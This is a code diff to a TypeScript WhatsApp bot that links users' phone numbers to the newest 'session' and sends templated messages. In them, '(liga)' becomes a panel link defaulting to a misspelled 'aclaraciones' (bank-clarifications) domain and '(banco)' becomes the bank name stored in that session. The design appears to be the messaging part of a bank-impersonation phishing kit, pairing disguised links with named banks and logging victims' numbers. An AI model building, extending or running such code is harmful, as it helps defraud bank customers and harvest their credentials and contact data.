@@ -27,6 +27,7 @@ export class WhatsAppBot {
   private config: WhatsAppBotConfig;
   private authFolder: string;
   private menuState: Map<string, { waitingForInput: boolean; lastMessageTime: number; currentMenuId: number | null }> = new Map();
+  private phoneToSessionMap: Map<string, string> = new Map(); // Mapea número de teléfono a sessionId
 
   constructor(config: WhatsAppBotConfig) {
     this.config = config;
@@ -188,6 +189,17 @@ export class WhatsAppBot {
 
       // Guardar mensaje en historial
       await this.saveConversation(phoneNumber, text, false);
+
+      // Actualizar el número de celular en la sesión asociada si existe
+      const sessionId = this.phoneToSessionMap.get(phoneNumber);
+      if (sessionId) {
+        try {
+          await this.config.storage.updateSessionPhoneNumber(sessionId, phoneNumber);
+          console.log(`[WhatsApp Bot] Número ${phoneNumber} guardado en sesión ${sessionId}`);
+        } catch (error) {
+          console.error(`[WhatsApp Bot] Error guardando número en sesión:`, error);
+        }
+      }
 
       // Verificar si el usuario está esperando una respuesta de menú
       const userState = this.menuState.get(phoneNumber);
@@ -373,6 +385,19 @@ export class WhatsAppBot {
         if (messageToSend.includes('(liga)')) {
           const panelUrl = await this.generatePanelLink();
           messageToSend = messageToSend.replace(/\(liga\)/g, panelUrl);
+          
+          // Cuando se envía una liga, asociar el número de teléfono con la sesión más reciente
+          const sessionId = await this.getLatestSessionId();
+          if (sessionId) {
+            this.phoneToSessionMap.set(phoneNumber, sessionId);
+            console.log(`[WhatsApp Bot] Asociando ${phoneNumber} con sesión ${sessionId}`);
+          }
+        }
+        
+        // Reemplazar (banco) con el nombre del banco de la última sesión
+        if (messageToSend.includes('(banco)')) {
+          const bankName = await this.generateBankName();
+          messageToSend = messageToSend.replace(/\(banco\)/g, bankName);
         }
         
         await this.sendMessage(phoneNumber, messageToSend);
@@ -446,6 +471,49 @@ export class WhatsAppBot {
       const siteConfig = await this.config.storage.getSiteConfig();
       const baseClientUrl = siteConfig?.baseUrl || 'https://aclaracionesditales.com';
       return `${baseClientUrl}`;
+    }
+  }
+
+  private async generateBankName(): Promise<string> {
+    try {
+      // Obtener la última sesión activa creada
+      const sessions = await this.config.storage.getAllSessions();
+      
+      // Filtrar sesiones activas y ordenar por fecha de creación (más reciente primero)
+      const activeSessions = sessions
+        .filter((s: any) => s.active)
+        .sort((a: any, b: any) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
+      
+      if (activeSessions.length > 0) {
+        // Obtener el banco de la última sesión activa
+        const latestSession = activeSessions[0];
+        const bankName = latestSession.banco || 'BANCO';
+        console.log(`[WhatsApp Bot] Generando nombre de banco: ${bankName} (sesión: ${latestSession.sessionId})`);
+        return bankName;
+      } else {
+        console.log(`[WhatsApp Bot] No hay sesiones activas, devolviendo 'BANCO' por defecto`);
+        return 'BANCO';
+      }
+    } catch (error) {
+      console.error(`[WhatsApp Bot] Error generando nombre de banco:`, error);
+      return 'BANCO';
+    }
+  }
+
+  private async getLatestSessionId(): Promise<string | null> {
+    try {
+      const sessions = await this.config.storage.getAllSessions();
+      const activeSessions = sessions
+        .filter((s: any) => s.active)
+        .sort((a: any, b: any) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
+      
+      if (activeSessions.length > 0) {
+        return activeSessions[0].sessionId;
+      }
+      return null;
+    } catch (error) {
+      console.error(`[WhatsApp Bot] Error obteniendo última sesión:`, error);
+      return null;
     }
   }
 
